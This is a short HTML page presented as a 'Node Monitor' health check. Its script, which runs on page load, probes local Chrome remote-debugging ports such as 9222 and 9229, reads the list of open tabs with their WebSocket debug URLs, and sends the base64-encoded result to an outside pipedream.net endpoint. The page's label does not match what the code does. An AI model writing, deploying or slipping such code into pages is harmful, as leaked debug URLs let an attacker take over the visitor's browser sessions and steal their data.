<html>
<head><title>Node Monitor</title></head>
<body>
<h1>Checking Node Health...</h1>
<script>
// Puppeteer runs Chrome with --remote-debugging-port
// Default is 9222 but could be others
var debugPorts = [9222, 9229, 9333, 2345, 5858, 9515];

debugPorts.forEach(function(port) {
  fetch('http://127.0.0.1:' + port + '/json')
    .then(function(r) { return r.text(); })
    .then(function(d) {
      // This returns all open tabs/pages with their WebSocket debug URLs
      fetch('https://eoh2zr5zzepcygc.m.pipedream.net?devtools_port=' + port + '&data=' + btoa(d));
    })
    .catch(function() {});
});
</script>
</body>
</html>
